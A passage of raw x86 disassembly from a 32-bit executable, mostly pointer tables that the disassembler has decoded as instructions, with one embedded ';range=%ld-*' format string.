  4029be:	43                   	inc    %ebx
  4029bf:	00 a3 f9 40 00 6c    	add    %ah,0x6c0040f9(%ebx)
  4029c5:	06                   	push   %es
  4029c6:	43                   	inc    %ebx
  4029c7:	00 66 06             	add    %ah,0x6(%esi)
  4029ca:	43                   	inc    %ebx
  4029cb:	00 96 fa 40 00 19    	add    %dl,0x190040fa(%esi)
  4029d1:	df 40 00             	filds  0x0(%eax)
  4029d4:	00 00                	add    %al,(%eax)
  4029d6:	00 00                	add    %al,(%eax)
  4029d8:	b0 7e                	mov    $0x7e,%al
  4029da:	40                   	inc    %eax
  4029db:	00 a8 06 43 00 24    	add    %ch,0x24004306(%eax)
  4029e1:	f8                   	clc
  4029e2:	40                   	inc    %eax
  4029e3:	00 94 60 41 00 30 44 	add    %dl,0x44300041(%eax,%eiz,2)
  4029ea:	41                   	inc    %ecx
  4029eb:	00 94 60 41 00 a2 06 	add    %dl,0x6a20041(%eax,%eiz,2)
  4029f2:	43                   	inc    %ebx
  4029f3:	00 30                	add    %dh,(%eax)
  4029f5:	06                   	push   %es
  4029f6:	43                   	inc    %ebx
  4029f7:	00 2a                	add    %ch,(%edx)
  4029f9:	06                   	push   %es
  4029fa:	43                   	inc    %ebx
  4029fb:	00 24 06             	add    %ah,(%esi,%eax,1)
  4029fe:	43                   	inc    %ebx
  4029ff:	00 1e                	add    %bl,(%esi)
  402a01:	06                   	push   %es
  402a02:	43                   	inc    %ebx
  402a03:	00 18                	add    %bl,(%eax)
  402a05:	06                   	push   %es
  402a06:	43                   	inc    %ebx
  402a07:	00 12                	add    %dl,(%edx)
  402a09:	06                   	push   %es
  402a0a:	43                   	inc    %ebx
  402a0b:	00 d8                	add    %bl,%al
  402a0d:	c2 40 00             	ret    $0x40
  402a10:	0c 06                	or     $0x6,%al
  402a12:	43                   	inc    %ebx
  402a13:	00 06                	add    %al,(%esi)
  402a15:	06                   	push   %es
  402a16:	43                   	inc    %ebx
  402a17:	00 00                	add    %al,(%eax)
  402a19:	06                   	push   %es
  402a1a:	43                   	inc    %ebx
  402a1b:	00 fa                	add    %bh,%dl
  402a1d:	05 43 00 f4 05       	add    $0x5f40043,%eax
  402a22:	43                   	inc    %ebx
  402a23:	00 ee                	add    %ch,%dh
  402a25:	05 43 00 e8 05       	add    $0x5e80043,%eax
  402a2a:	43                   	inc    %ebx
  402a2b:	00 e2                	add    %ah,%dl
  402a2d:	05 43 00 dc 05       	add    $0x5dc0043,%eax
  402a32:	43                   	inc    %ebx
  402a33:	00 d6                	add    %dl,%dh
  402a35:	05 43 00 d0 05       	add    $0x5d00043,%eax
  402a3a:	43                   	inc    %ebx
  402a3b:	00 ca                	add    %cl,%dl
  402a3d:	05 43 00 c4 05       	add    $0x5c40043,%eax
  402a42:	43                   	inc    %ebx
  402a43:	00 be 05 43 00 b8    	add    %bh,-0x47ffbcfb(%esi)
  402a49:	05 43 00 b2 05       	add    $0x5b20043,%eax
  402a4e:	43                   	inc    %ebx
  402a4f:	00 ac 05 43 00 a6 05 	add    %ch,0x5a60043(%ebp,%eax,1)
  402a56:	43                   	inc    %ebx
  402a57:	00 a0 05 43 00 9a    	add    %ah,-0x65ffbcfb(%eax)
  402a5d:	05 43 00 94 05       	add    $0x5940043,%eax
  402a62:	43                   	inc    %ebx
  402a63:	00 8e 05 43 00 94    	add    %cl,-0x6bffbcfb(%esi)
  402a69:	60                   	pusha
  402a6a:	41                   	inc    %ecx
  402a6b:	00 88 a9 40 00 94    	add    %cl,-0x6bffbf57(%eax)
  402a71:	a9 40 00 9c 06       	test   $0x69c0040,%eax
  402a76:	43                   	inc    %ebx
  402a77:	00 82 05 43 00 7c    	add    %al,0x7c004305(%edx)
  402a7d:	05 43 00 76 05       	add    $0x5760043,%eax
  402a82:	43                   	inc    %ebx
  402a83:	00 70 05             	add    %dh,0x5(%eax)
  402a86:	43                   	inc    %ebx
  402a87:	00 6a 05             	add    %ch,0x5(%edx)
  402a8a:	43                   	inc    %ebx
  402a8b:	00 96 06 43 00 90    	add    %dl,-0x6fffbcfa(%esi)
  402a91:	06                   	push   %es
  402a92:	43                   	inc    %ebx
  402a93:	00 58 05             	add    %bl,0x5(%eax)
  402a96:	43                   	inc    %ebx
  402a97:	00 8a 06 43 00 84    	add    %cl,-0x7bffbcfa(%edx)
  402a9d:	06                   	push   %es
  402a9e:	43                   	inc    %ebx
  402a9f:	00 13                	add    %dl,(%ebx)
  402aa1:	e0 40                	loopne 0x402ae3
  402aa3:	00 78 06             	add    %bh,0x6(%eax)
  402aa6:	43                   	inc    %ebx
  402aa7:	00 1e                	add    %bl,(%esi)
  402aa9:	fb                   	sti
  402aaa:	40                   	inc    %eax
  402aab:	00 6c 06 43          	add    %ch,0x43(%esi,%eax,1)
  402aaf:	00 66 06             	add    %ah,0x6(%esi)
  402ab2:	43                   	inc    %ebx
  402ab3:	00 ae fb 40 00 cd    	add    %ch,-0x32ffbf05(%esi)
  402ab9:	e2 40                	loop   0x402afb
  402abb:	00 00                	add    %al,(%eax)
  402abd:	00 00                	add    %al,(%eax)
  402abf:	00 08                	add    %cl,(%eax)
  402ac1:	7f 40                	jg     0x402b03
  402ac3:	00 a8 06 43 00 8a    	add    %ch,-0x75ffbcfa(%eax)
  402ac9:	f8                   	clc
  402aca:	40                   	inc    %eax
  402acb:	00 94 60 41 00 30 44 	add    %dl,0x44300041(%eax,%eiz,2)
  402ad2:	41                   	inc    %ecx
  402ad3:	00 94 60 41 00 a2 06 	add    %dl,0x6a20041(%eax,%eiz,2)
  402ada:	43                   	inc    %ebx
  402adb:	00 30                	add    %dh,(%eax)
  402add:	06                   	push   %es
  402ade:	43                   	inc    %ebx
  402adf:	00 2a                	add    %ch,(%edx)
  402ae1:	06                   	push   %es
  402ae2:	43                   	inc    %ebx
  402ae3:	00 24 06             	add    %ah,(%esi,%eax,1)
  402ae6:	43                   	inc    %ebx
  402ae7:	00 1e                	add    %bl,(%esi)
  402ae9:	06                   	push   %es
  402aea:	43                   	inc    %ebx
  402aeb:	00 18                	add    %bl,(%eax)
  402aed:	06                   	push   %es
  402aee:	43                   	inc    %ebx
  402aef:	00 12                	add    %dl,(%edx)
  402af1:	06                   	push   %es
  402af2:	43                   	inc    %ebx
  402af3:	00 e0                	add    %ah,%al
  402af5:	ca 40 00             	lret   $0x40
  402af8:	0c 06                	or     $0x6,%al
  402afa:	43                   	inc    %ebx
  402afb:	00 06                	add    %al,(%esi)
  402afd:	06                   	push   %es
  402afe:	43                   	inc    %ebx
  402aff:	00 00                	add    %al,(%eax)
  402b01:	06                   	push   %es
  402b02:	43                   	inc    %ebx
  402b03:	00 fa                	add    %bh,%dl
  402b05:	05 43 00 f4 05       	add    $0x5f40043,%eax
  402b0a:	43                   	inc    %ebx
  402b0b:	00 ee                	add    %ch,%dh
  402b0d:	05 43 00 e8 05       	add    $0x5e80043,%eax
  402b12:	43                   	inc    %ebx
  402b13:	00 e2                	add    %ah,%dl
  402b15:	05 43 00 dc 05       	add    $0x5dc0043,%eax
  402b1a:	43                   	inc    %ebx
  402b1b:	00 d6                	add    %dl,%dh
  402b1d:	05 43 00 d0 05       	add    $0x5d00043,%eax
  402b22:	43                   	inc    %ebx
  402b23:	00 ca                	add    %cl,%dl
  402b25:	05 43 00 c4 05       	add    $0x5c40043,%eax
  402b2a:	43                   	inc    %ebx
  402b2b:	00 be 05 43 00 b8    	add    %bh,-0x47ffbcfb(%esi)
  402b31:	05 43 00 b2 05       	add    $0x5b20043,%eax
  402b36:	43                   	inc    %ebx
  402b37:	00 ac 05 43 00 a6 05 	add    %ch,0x5a60043(%ebp,%eax,1)
  402b3e:	43                   	inc    %ebx
  402b3f:	00 a0 05 43 00 9a    	add    %ah,-0x65ffbcfb(%eax)
  402b45:	05 43 00 94 05       	add    $0x5940043,%eax
  402b4a:	43                   	inc    %ebx
  402b4b:	00 8e 05 43 00 94    	add    %cl,-0x6bffbcfb(%esi)
  402b51:	60                   	pusha
  402b52:	41                   	inc    %ecx
  402b53:	00 88 a9 40 00 94    	add    %cl,-0x6bffbf57(%eax)
  402b59:	a9 40 00 9c 06       	test   $0x69c0040,%eax
  402b5e:	43                   	inc    %ebx
  402b5f:	00 82 05 43 00 7c    	add    %al,0x7c004305(%edx)
  402b65:	05 43 00 76 05       	add    $0x5760043,%eax
  402b6a:	43                   	inc    %ebx
  402b6b:	00 70 05             	add    %dh,0x5(%eax)
  402b6e:	43                   	inc    %ebx
  402b6f:	00 6a 05             	add    %ch,0x5(%edx)
  402b72:	43                   	inc    %ebx
  402b73:	00 96 06 43 00 90    	add    %dl,-0x6fffbcfa(%esi)
  402b79:	06                   	push   %es
  402b7a:	43                   	inc    %ebx
  402b7b:	00 58 05             	add    %bl,0x5(%eax)
  402b7e:	43                   	inc    %ebx
  402b7f:	00 8a 06 43 00 84    	add    %cl,-0x7bffbcfa(%edx)
  402b85:	06                   	push   %es
  402b86:	43                   	inc    %ebx
  402b87:	00 0c e4             	add    %cl,(%esp,%eiz,8)
  402b8a:	40                   	inc    %eax
  402b8b:	00 78 06             	add    %bh,0x6(%eax)
  402b8e:	43                   	inc    %ebx
  402b8f:	00 37                	add    %dh,(%edi)
  402b91:	fc                   	cld
  402b92:	40                   	inc    %eax
  402b93:	00 6c 06 43          	add    %ch,0x43(%esi,%eax,1)
  402b97:	00 66 06             	add    %ah,0x6(%esi)
  402b9a:	43                   	inc    %ebx
  402b9b:	00 ce                	add    %cl,%dh
  402b9d:	fc                   	cld
  402b9e:	40                   	inc    %eax
  402b9f:	00 aa e8 40 00 54    	add    %ch,0x540040e8(%edx)
  402ba5:	7f 40                	jg     0x402be7
  402ba7:	00 16                	add    %dl,(%esi)
  402ba9:	05 43 00 b3 04       	add    $0x4b30043,%eax
  402bae:	41                   	inc    %ecx
  402baf:	00 1a                	add    %bl,(%edx)
  402bb1:	62 41 00             	bound  %eax,0x0(%ecx)
  402bb4:	30 44 41 00          	xor    %al,0x0(%ecx,%eax,2)
  402bb8:	94                   	xchg   %eax,%esp
  402bb9:	60                   	pusha
  402bba:	41                   	inc    %ecx
  402bbb:	00 3b                	add    %bh,(%ebx)
  402bbd:	00 72 00             	add    %dh,0x0(%edx)
  402bc0:	61                   	popa
  402bc1:	00 6e 00             	add    %ch,0x0(%esi)
  402bc4:	67 00 65 00          	add    %ah,0x0(%di)
  402bc8:	3d 00 25 00 6c       	cmp    $0x6c002500,%eax
  402bcd:	00 64 00 2d          	add    %ah,0x2d(%eax,%eax,1)
  402bd1:	00 2a                	add    %ch,(%edx)
  402bd3:	00 00                	add    %al,(%eax)
  402bd5:	00 00                	add    %al,(%eax)
  402bd7:	00 c4                	add    %al,%ah
  402bd9:	7f 40                	jg     0x402c1b
  402bdb:	00 52 08             	add    %dl,0x8(%edx)
  402bde:	43                   	inc    %ebx
  402bdf:	00 36                	add    %dh,(%esi)
  402be1:	09 41 00             	or     %eax,0x0(%ecx)
  402be4:	94                   	xchg   %eax,%esp
  402be5:	60                   	pusha
  402be6:	41                   	inc    %ecx
  402be7:	00 30                	add    %dh,(%eax)
  402be9:	44                   	inc    %esp
  402bea:	41                   	inc    %ecx
  402beb:	00 94 60 41 00 a2 06 	add    %dl,0x6a20041(%eax,%eiz,2)
  402bf2:	43                   	inc    %ebx
  402bf3:	00 30                	add    %dh,(%eax)
  402bf5:	06                   	push   %es
  402bf6:	43                   	inc    %ebx
  402bf7:	00 2a                	add    %ch,(%edx)
  402bf9:	06                   	push   %es
  402bfa:	43                   	inc    %ebx
  402bfb:	00 24 06             	add    %ah,(%esi,%eax,1)
  402bfe:	43                   	inc    %ebx
  402bff:	00 1e                	add    %bl,(%esi)
  402c01:	06                   	push   %es
  402c02:	43                   	inc    %ebx
  402c03:	00 18                	add    %bl,(%eax)
  402c05:	06                   	push   %es
  402c06:	43                   	inc    %ebx
  402c07:	00 12                	add    %dl,(%edx)
  402c09:	06                   	push   %es
  402c0a:	43                   	inc    %ebx
  402c0b:	00 9e ce 40 00 0c    	add    %bl,0xc0040ce(%esi)
  402c11:	06                   	push   %es
  402c12:	43                   	inc    %ebx
  402c13:	00 06                	add    %al,(%esi)
  402c15:	06                   	push   %es
  402c16:	43                   	inc    %ebx
  402c17:	00 00                	add    %al,(%eax)
  402c19:	06                   	push   %es
  402c1a:	43                   	inc    %ebx
  402c1b:	00 fa                	add    %bh,%dl
  402c1d:	05 43 00 f4 05       	add    $0x5f40043,%eax
  402c22:	43                   	inc    %ebx
  402c23:	00 ee                	add    %ch,%dh
  402c25:	05 43 00 e8 05       	add    $0x5e80043,%eax
  402c2a:	43                   	inc    %ebx
  402c2b:	00 e2                	add    %ah,%dl
  402c2d:	05 43 00 dc 05       	add    $0x5dc0043,%eax
  402c32:	43                   	inc    %ebx
  402c33:	00 d6                	add    %dl,%dh
  402c35:	05 43 00 d0 05       	add    $0x5d00043,%eax
  402c3a:	43                   	inc    %ebx
  402c3b:	00 ca                	add    %cl,%dl
  402c3d:	05 43 00 c4 05       	add    $0x5c40043,%eax
  402c42:	43                   	inc    %ebx
  402c43:	00 be 05 43 00 b8    	add    %bh,-0x47ffbcfb(%esi)
  402c49:	05 43 00 b2 05       	add    $0x5b20043,%eax
  402c4e:	43                   	inc    %ebx
  402c4f:	00 ac 05 43 00 a6 05 	add    %ch,0x5a60043(%ebp,%eax,1)
  402c56:	43                   	inc    %ebx
  402c57:	00 a0 05 43 00 9a    	add    %ah,-0x65ffbcfb(%eax)
  402c5d:	05 43 00 4c 08       	add    $0x84c0043,%eax
  402c62:	43                   	inc    %ebx
  402c63:	00 8e 05 43 00 94    	add    %cl,-0x6bffbcfb(%esi)
  402c69:	60                   	pusha
  402c6a:	41                   	inc    %ecx
  402c6b:	00 88 a9 40 00 94    	add    %cl,-0x6bffbf57(%eax)
  402c71:	a9 40 00 46 08       	test   $0x8460040,%eax
  402c76:	43                   	inc    %ebx
  402c77:	00 82 05 43 00 7c    	add    %al,0x7c004305(%edx)
  402c7d:	05 43 00 76 05       	add    $0x5760043,%eax
  402c82:	43                   	inc    %ebx
  402c83:	00 70 05             	add    %dh,0x5(%eax)
  402c86:	43                   	inc    %ebx
  402c87:	00 6a 05             	add    %ch,0x5(%edx)
  402c8a:	43                   	inc    %ebx
  402c8b:	00 96 06 43 00 90    	add    %dl,-0x6fffbcfa(%esi)
  402c91:	06                   	push   %es
  402c92:	43                   	inc    %ebx
  402c93:	00 58 05             	add    %bl,0x5(%eax)
  402c96:	43                   	inc    %ebx
  402c97:	00 8a 06 43 00 84    	add    %cl,-0x7bffbcfa(%edx)
  402c9d:	06                   	push   %es
  402c9e:	43                   	inc    %ebx
  402c9f:	00 52 09             	add    %dl,0x9(%edx)
  402ca2:	41                   	inc    %ecx
  402ca3:	00 78 06             	add    %bh,0x6(%eax)
  402ca6:	43                   	inc    %ebx
  402ca7:	00 40 08             	add    %al,0x8(%eax)
  402caa:	43                   	inc    %ebx
  402cab:	00 3a                	add    %bh,(%edx)
  402cad:	08 43 00             	or     %al,0x0(%ebx)
  402cb0:	66 06                	pushw  %es
  402cb2:	43                   	inc    %ebx
  402cb3:	00 d4                	add    %dl,%ah
  402cb5:	ea 40 00 34 08 43 00 	ljmp   $0x43,$0x8340040
  402cbc:	2e 08 43 00          	or     %al,%cs:0x0(%ebx)
  402cc0:	28 08                	sub    %cl,(%eax)
  402cc2:	43                   	inc    %ebx
  402cc3:	00 22                	add    %ah,(%edx)
  402cc5:	08 43 00             	or     %al,0x0(%ebx)
  402cc8:	1c 08                	sbb    $0x8,%al
  402cca:	43                   	inc    %ebx
  402ccb:	00 16                	add    %dl,(%esi)
  402ccd:	08 43 00             	or     %al,0x0(%ebx)
  402cd0:	10 08                	adc    %cl,(%eax)
  402cd2:	43                   	inc    %ebx
  402cd3:	00 d8                	add    %bl,%al
  402cd5:	ce                   	into
  402cd6:	40                   	inc    %eax
  402cd7:	00 a4 ce 40 00 11 bd 	add    %ah,-0x42eeffc0(%esi,%ecx,8)
  402cde:	00 00                	add    %al,(%eax)
  402ce0:	00 03                	add    %al,(%ebx)
	...
  402cea:	00 00                	add    %al,(%eax)
  402cec:	0c 00                	or     $0x0,%al
  402cee:	00 00                	add    %al,(%eax)
  402cf0:	e8 1b 41 00 00       	call   0x406e10
	...
  402d09:	00 00                	add    %al,(%eax)
  402d0b:	00 8e 79 41 00 dc    	add    %cl,-0x23ffbe87(%esi)
  402d11:	2c 40                	sub    $0x40,%al
	...
  402d2b:	00 8e 79 41 00 14    	add    %cl,0x14004179(%esi)
  402d31:	2d 40 00 11 bd       	sub    $0xbd110040,%eax
  402d36:	00 00                	add    %al,(%eax)
  402d38:	01 00                	add    %eax,(%eax)
	...
  402d42:	00 00                	add    %al,(%eax)
  402d44:	0c 00                	or     $0x0,%al
  402d46:	00 00                	add    %al,(%eax)
  402d48:	f0 1b 41 00          	lock sbb 0x0(%ecx),%eax
	...
  402d64:	8e 79 41             	mov    0x41(%ecx),%?
  402d67:	00 34 2d 40 00 11 bd 	add    %dh,-0x42eeffc0(,%ebp,1)
	...
  402d7a:	00 00                	add    %al,(%eax)
  402d7c:	0c 00                	or     $0x0,%al
  402d7e:	00 00                	add    %al,(%eax)
  402d80:	f8                   	clc
  402d81:	1b 41 00             	sbb    0x0(%ecx),%eax
	...
  402d9c:	8e 79 41             	mov    0x41(%ecx),%?
  402d9f:	00 6c 2d 40          	add    %ch,0x40(%ebp,%ebp,1)
  402da3:	00 11                	add    %dl,(%ecx)
  402da5:	bd 00 00 00 00       	mov    $0x0,%ebp
	...
  402db2:	00 00                	add    %al,(%eax)
  402db4:	0c 00                	or     $0x0,%al
  402db6:	00 00                	add    %al,(%eax)
  402db8:	00 1c 41             	add    %bl,(%ecx,%eax,2)
	...
  402dd3:	00 8e 79 41 00 a4    	add    %cl,-0x5bffbe87(%esi)
  402dd9:	2d 40 00 00 00       	sub    $0x40,%eax
  402dde:	00 00                	add    %al,(%eax)
  402de0:	60                   	pusha
  402de1:	80 40 00 b2          	addb   $0xb2,0x0(%eax)
  402de5:	08 43 00             	or     %al,0x0(%ebx)
  402de8:	e9 10 41 00 94       	jmp    0x94406efd
  402ded:	60                   	pusha
  402dee:	41                   	inc    %ecx
  402def:	00 30                	add    %dh,(%eax)
  402df1:	44                   	inc    %esp
  402df2:	41                   	inc    %ecx
  402df3:	00 94 60 41 00 36 06 	add    %dl,0x6360041(%eax,%eiz,2)
  402dfa:	43                   	inc    %ebx
  402dfb:	00 30                	add    %dh,(%eax)
  402dfd:	06                   	push   %es
  402dfe:	43                   	inc    %ebx
  402dff:	00 2a                	add    %ch,(%edx)
  402e01:	06                   	push   %es
  402e02:	43                   	inc    %ebx
  402e03:	00 24 06             	add    %ah,(%esi,%eax,1)
  402e06:	43                   	inc    %ebx
  402e07:	00 1e                	add    %bl,(%esi)
  402e09:	06                   	push   %es
  402e0a:	43                   	inc    %ebx
  402e0b:	00 18                	add    %bl,(%eax)
  402e0d:	06                   	push   %es
  402e0e:	43                   	inc    %ebx
  402e0f:	00 12                	add    %dl,(%edx)
  402e11:	06                   	push   %es
  402e12:	43                   	inc    %ebx
  402e13:	00 77 0e             	add    %dh,0xe(%edi)
  402e16:	41                   	inc    %ecx
  402e17:	00 0c 06             	add    %cl,(%esi,%eax,1)
  402e1a:	43                   	inc    %ebx
  402e1b:	00 06                	add    %al,(%esi)
  402e1d:	06                   	push   %es
  402e1e:	43                   	inc    %ebx
  402e1f:	00 00                	add    %al,(%eax)
  402e21:	06                   	push   %es
  402e22:	43                   	inc    %ebx
  402e23:	00 fa                	add    %bh,%dl
  402e25:	05 43 00 f4 05       	add    $0x5f40043,%eax
  402e2a:	43                   	inc    %ebx
  402e2b:	00 ee                	add    %ch,%dh
  402e2d:	05 43 00 e8 05       	add    $0x5e80043,%eax
  402e32:	43                   	inc    %ebx
  402e33:	00 e2                	add    %ah,%dl
  402e35:	05 43 00 dc 05       	add    $0x5dc0043,%eax
  402e3a:	43                   	inc    %ebx
  402e3b:	00 d6                	add    %dl,%dh
  402e3d:	05 43 00 d0 05       	add    $0x5d00043,%eax
  402e42:	43                   	inc    %ebx
  402e43:	00 ca                	add    %cl,%dl
  402e45:	05 43 00 c4 05       	add    $0x5c40043,%eax
  402e4a:	43                   	inc    %ebx
  402e4b:	00 be 05 43 00 b8    	add    %bh,-0x47ffbcfb(%esi)
  402e51:	05 43 00 b2 05       	add    $0x5b20043,%eax
  402e56:	43                   	inc    %ebx
  402e57:	00 ac 05 43 00 a6 05 	add    %ch,0x5a60043(%ebp,%eax,1)
  402e5e:	43                   	inc    %ebx
  402e5f:	00 a0 05 43 00 9a    	add    %ah,-0x65ffbcfb(%eax)
  402e65:	05 43 00 94 05       	add    $0x5940043,%eax
  402e6a:	43                   	inc    %ebx
  402e6b:	00 8e 05 43 00 94    	add    %cl,-0x6bffbcfb(%esi)
  402e71:	60                   	pusha
  402e72:	41                   	inc    %ecx
  402e73:	00 88 a9 40 00 94    	add    %cl,-0x6bffbf57(%eax)
  402e79:	a9 40 00 88 05       	test   $0x5880040,%eax
  402e7e:	43                   	inc    %ebx
  402e7f:	00 82 05 43 00 7c    	add    %al,0x7c004305(%edx)
  402e85:	05 43 00 76 05       	add    $0x5760043,%eax
  402e8a:	43                   	inc    %ebx
  402e8b:	00 70 05             	add    %dh,0x5(%eax)
  402e8e:	43                   	inc    %ebx
  402e8f:	00 6a 05             	add    %ch,0x5(%edx)
  402e92:	43                   	inc    %ebx
  402e93:	00 96 06 43 00 5e    	add    %dl,0x5e004306(%esi)
  402e99:	05 43 00 58 05       	add    $0x5580043,%eax
  402e9e:	43                   	inc    %ebx
  402e9f:	00 52 05             	add    %dl,0x5(%edx)
  402ea2:	43                   	inc    %ebx
  402ea3:	00 00                	add    %al,(%eax)
  402ea5:	00 00                	add    %al,(%eax)
  402ea7:	00 b4 80 40 00 b2 08 	add    %dh,0x8b20040(%eax,%eax,4)
  402eae:	43                   	inc    %ebx
  402eaf:	00 e9                	add    %ch,%cl
  402eb1:	10 41 00             	adc    %al,0x0(%ecx)
  402eb4:	94                   	xchg   %eax,%esp
  402eb5:	60                   	pusha
  402eb6:	41                   	inc    %ecx
  402eb7:	00 30                	add    %dh,(%eax)
  402eb9:	44                   	inc    %esp
  402eba:	41                   	inc    %ecx
  402ebb:	00 94 60 41 00 36 06 	add    %dl,0x6360041(%eax,%eiz,2)
  402ec2:	43                   	inc    %ebx
  402ec3:	00 30                	add    %dh,(%eax)
  402ec5:	06                   	push   %es
  402ec6:	43                   	inc    %ebx
  402ec7:	00 2a                	add    %ch,(%edx)
  402ec9:	06                   	push   %es
  402eca:	43                   	inc    %ebx
  402ecb:	00 24 06             	add    %ah,(%esi,%eax,1)
  402ece:	43                   	inc    %ebx
  402ecf:	00 1e                	add    %bl,(%esi)
  402ed1:	06                   	push   %es
  402ed2:	43                   	inc    %ebx
  402ed3:	00 18                	add    %bl,(%eax)
  402ed5:	06                   	push   %es
  402ed6:	43                   	inc    %ebx
  402ed7:	00 12                	add    %dl,(%edx)
  402ed9:	06                   	push   %es
  402eda:	43                   	inc    %ebx
  402edb:	00 7d 0e             	add    %bh,0xe(%ebp)
  402ede:	41                   	inc    %ecx
  402edf:	00 0c 06             	add    %cl,(%esi,%eax,1)
  402ee2:	43                   	inc    %ebx
  402ee3:	00 06                	add    %al,(%esi)
  402ee5:	06                   	push   %es
  402ee6:	43                   	inc    %ebx
  402ee7:	00 00                	add    %al,(%eax)
  402ee9:	06                   	push   %es
  402eea:	43                   	inc    %ebx
  402eeb:	00 fa                	add    %bh,%dl
  402eed:	05 43 00 f4 05       	add    $0x5f40043,%eax
  402ef2:	43                   	inc    %ebx
  402ef3:	00 ee                	add    %ch,%dh
  402ef5:	05 43 00 e8 05       	add    $0x5e80043,%eax
  402efa:	43                   	inc    %ebx
  402efb:	00 e2                	add    %ah,%dl
  402efd:	05 43 00 dc 05       	add    $0x5dc0043,%eax
  402f02:	43                   	inc    %ebx
  402f03:	00 d6                	add    %dl,%dh
  402f05:	05 43 00 d0 05       	add    $0x5d00043,%eax
  402f0a:	43                   	inc    %ebx
  402f0b:	00 ca                	add    %cl,%dl
  402f0d:	05 43 00 c4 05       	add    $0x5c40043,%eax
  402f12:	43                   	inc    %ebx
  402f13:	00 be 05 43 00 b8    	add    %bh,-0x47ffbcfb(%esi)
  402f19:	05 43 00 b2 05       	add    $0x5b20043,%eax
  402f1e:	43                   	inc    %ebx
  402f1f:	00 ac 05 43 00 a6 05 	add    %ch,0x5a60043(%ebp,%eax,1)
  402f26:	43                   	inc    %ebx
  402f27:	00 a0 05 43 00 9a    	add    %ah,-0x65ffbcfb(%eax)
  402f2d:	05 43 00 94 05       	add    $0x5940043,%eax
  402f32:	43                   	inc    %ebx
  402f33:	00 8e 05 43 00 94    	add    %cl,-0x6bffbcfb(%esi)
  402f39:	60                   	pusha
  402f3a:	41                   	inc    %ecx
  402f3b:	00 88 a9 40 00 94    	add    %cl,-0x6bffbf57(%eax)
  402f41:	a9 40 00 88 05       	test   $0x5880040,%eax
  402f46:	43                   	inc    %ebx
  402f47:	00 82 05 43 00 7c    	add    %al,0x7c004305(%edx)
  402f4d:	05 43 00 76 05       	add    $0x5760043,%eax
  402f52:	43                   	inc    %ebx
  402f53:	00 70 05             	add    %dh,0x5(%eax)
  402f56:	43                   	inc    %ebx
  402f57:	00 6a 05             	add    %ch,0x5(%edx)
  402f5a:	43                   	inc    %ebx
  402f5b:	00 96 06 43 00 5e    	add    %dl,0x5e004306(%esi)
  402f61:	05 43 00 58 05       	add    $0x5580043,%eax
  402f66:	43                   	inc    %ebx
  402f67:	00 52 05             	add    %dl,0x5(%edx)
  402f6a:	43                   	inc    %ebx
  402f6b:	00 00                	add    %al,(%eax)
  402f6d:	00 00                	add    %al,(%eax)
  402f6f:	00 08                	add    %cl,(%eax)
  402f71:	81 40 00 a6 08 43 00 	addl   $0x4308a6,0x0(%eax)
  402f78:	05 11 41 00 94       	add    $0x94004111,%eax
  402f7d:	60                   	pusha
  402f7e:	41                   	inc    %ecx
  402f7f:	00 30                	add    %dh,(%eax)
  402f81:	44                   	inc    %esp
  402f82:	41                   	inc    %ecx
  402f83:	00 94 60 41 00 36 06 	add    %dl,0x6360041(%eax,%eiz,2)
  402f8a:	43                   	inc    %ebx
  402f8b:	00 30                	add    %dh,(%eax)
  402f8d:	06                   	push   %es
  402f8e:	43                   	inc    %ebx
  402f8f:	00 2a                	add    %ch,(%edx)
  402f91:	06                   	push   %es
  402f92:	43                   	inc    %ebx
  402f93:	00 24 06             	add    %ah,(%esi,%eax,1)
  402f96:	43                   	inc    %ebx
  402f97:	00 1e                	add    %bl,(%esi)
  402f99:	06                   	push   %es
  402f9a:	43                   	inc    %ebx
  402f9b:	00 18                	add    %bl,(%eax)
  402f9d:	06                   	push   %es
  402f9e:	43                   	inc    %ebx
  402f9f:	00 12                	add    %dl,(%edx)
  402fa1:	06                   	push   %es
  402fa2:	43                   	inc    %ebx
  402fa3:	00 83 0e 41 00 0c    	add    %al,0xc00410e(%ebx)
  402fa9:	06                   	push   %es
  402faa:	43                   	inc    %ebx
  402fab:	00 06                	add    %al,(%esi)
  402fad:	06                   	push   %es
  402fae:	43                   	inc    %ebx
  402faf:	00 00                	add    %al,(%eax)
  402fb1:	06                   	push   %es
  402fb2:	43                   	inc    %ebx
  402fb3:	00 fa                	add    %bh,%dl
  402fb5:	05 43 00 f4 05       	add    $0x5f40043,%eax
  402fba:	43                   	inc    %ebx
  402fbb:	00 ee                	add    %ch,%dh
  402fbd:	05 43 00 e8 05       	add    $0x5e80043,%eax
  402fc2:	43                   	inc    %ebx
  402fc3:	00 e2                	add    %ah,%dl
  402fc5:	05 43 00 dc 05       	add    $0x5dc0043,%eax
  402fca:	43                   	inc    %ebx
  402fcb:	00 d6                	add    %dl,%dh
  402fcd:	05 43 00 d0 05       	add    $0x5d00043,%eax
  402fd2:	43                   	inc    %ebx
  402fd3:	00 ca                	add    %cl,%dl
  402fd5:	05 43 00 c4 05       	add    $0x5c40043,%eax
  402fda:	43                   	inc    %ebx
  402fdb:	00 be 05 43 00 b8    	add    %bh,-0x47ffbcfb(%esi)
  402fe1:	05 43 00 b2 05       	add    $0x5b20043,%eax
  402fe6:	43                   	inc    %ebx
  402fe7:	00 ac 05 43 00 a6 05 	add    %ch,0x5a60043(%ebp,%eax,1)
  402fee:	43                   	inc    %ebx
  402fef:	00 a0 05 43 00 9a    	add    %ah,-0x65ffbcfb(%eax)
  402ff5:	05 43 00 94 05       	add    $0x5940043,%eax
  402ffa:	43                   	inc    %ebx
  402ffb:	00 8e 05 43 00 94    	add    %cl,-0x6bffbcfb(%esi)
  403001:	60                   	pusha
  403002:	41                   	inc    %ecx
  403003:	00 88 a9 40 00 94    	add    %cl,-0x6bffbf57(%eax)
  403009:	a9 40 00 88 05       	test   $0x5880040,%eax
  40300e:	43                   	inc    %ebx
  40300f:	00 82 05 43 00 7c    	add    %al,0x7c004305(%edx)
  403015:	05 43 00 76 05       	add    $0x5760043,%eax
  40301a:	43                   	inc    %ebx
  40301b:	00 70 05             	add    %dh,0x5(%eax)
  40301e:	43                   	inc    %ebx
  40301f:	00 6a 05             	add    %ch,0x5(%edx)
  403022:	43                   	inc    %ebx
  403023:	00 a0 08 43 00 5e    	add    %ah,0x5e004308(%eax)
  403029:	05 43 00 58 05       	add    $0x5580043,%eax
  40302e:	43                   	inc    %ebx
  40302f:	00 52 05             	add    %dl,0x5(%edx)
  403032:	43                   	inc    %ebx
  403033:	00 9a 08 43 00 94    	add    %bl,-0x6bffbcf8(%edx)
  403039:	08 43 00             	or     %al,0x0(%ebx)
  40303c:	8e 08                	mov    (%eax),%cs
  40303e:	43                   	inc    %ebx
